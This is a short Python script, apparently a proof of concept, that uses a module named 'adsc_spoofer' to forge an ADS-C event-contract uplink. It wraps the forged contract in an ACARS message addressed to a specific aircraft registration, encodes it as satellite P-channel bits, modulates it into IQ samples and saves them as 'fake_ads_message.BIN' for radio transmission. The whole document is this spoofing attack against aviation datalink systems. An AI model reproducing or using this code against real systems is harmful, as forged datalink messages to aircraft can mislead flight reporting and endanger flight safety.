from adsc_spoofer import up_event_contract, modulate, get_acars_message, get_p_channel_bits

adsc_message = up_event_contract(
    contract_number=3, 
    waypoint_change=True, 
    altitude_range={
    "ceiling": int(15000/4), 
    "floor": int(21000/4)
  }
)
acars_message = get_acars_message(adsc_message, ".9XR-WP", "BZVCAYA", "W")
bits = get_p_channel_bits(acars_message, "06E010", "C1", 7, 9, 5)
iq_samples = modulate(bits)

with open('./fake_ads_message.BIN', 'wb') as f:
    f.write(iq_samples.tobytes())
